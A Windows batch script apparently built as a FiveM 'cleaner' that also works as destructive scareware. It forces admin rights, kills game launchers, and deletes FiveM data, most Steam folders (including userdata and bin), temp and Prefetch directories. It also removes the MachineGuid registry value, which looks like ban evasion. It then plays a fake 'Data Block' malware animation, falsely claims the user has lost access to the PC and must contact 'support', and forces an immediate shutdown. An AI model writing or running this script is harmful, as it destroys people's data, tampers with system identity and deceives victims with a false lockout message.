@echo off

:: Force the script to run as an administrator
net session >nul 2>nul
if %errorlevel% neq 0 (
    powershell -command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b 1
)

:: Kill running processes
taskkill /f /im FiveM.exe >nul 2>nul
taskkill /f /im steam.exe >nul 2>nul
taskkill /f /im EpicGamesLauncher.exe >nul 2>nul

:: Clean FiveM directories
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\data\cache" >nul 2>nul
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\data\nui-storage" >nul 2>nul
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\data\server-cache" >nul 2>nul
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\data\server-cache-priv" >nul 2>nul
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\crashes" >nul 2>nul
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\logs" >nul 2>nul

:: Clean Digital Entitlements and CitizenFX
rmdir /s /q "%LocalAppData%\DigitalEntitlements" >nul 2>nul
rmdir /s /q "%AppData%\CitizenFX\kvs" >nul 2>nul

:: Clean Steam directories
set steamDir="C:\Program Files (x86)\Steam"
for %%i in (
    userdata, appcache, bin, clientui, config, controller_base, dumps,
    friends, graphics, logs, music, package, public, resource, steam,
    steamui, tenfoot
) do (
    rmdir /s /q %steamDir%\%%i >nul 2>nul
)

:: Clean temporary files and Windows system cache
rmdir /s /q "%UserProfile%\AppData\Local\Temp" >nul 2>nul
rmdir /s /q "C:\Windows\temp" >nul 2>nul
mkdir C:\Windows\temp >nul 2>nul

rmdir /s /q "C:\Windows\Prefetch" >nul 2>nul
mkdir C:\Windows\Prefetch >nul 2>nul

:: Reset Machine GUID
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography" /v MachineGuid /f >nul 2>nul

:: Fake malware effect
cls
color 0a
timeout /t 2 >nul

setlocal enabledelayedexpansion

for /L %%a in (1,1,50) do (
    set /a randNum=!random!
    echo [%%a] Data Block: !randNum!
    timeout /t 0.1 >nul
)

:: Final message
cls
color 0c
echo YOU HAVE NO LONGER ACCES TO THIS PC. PLEASE CONTACT THE SUPPORT TEAM TO REPAIR. CONTACT HERE, CLC ON TOP MA REGII MAAAA.
timeout /t 1 >nul

:: =============== BEEP BEEP PANIC MODE ==================
for /L %%b in (1,1,5) do (
    echo ^G
    timeout /t 0.3 >nul
)

timeout /t 3 >nul


endlocal

:: Shutdown
shutdown /s /t 0 /f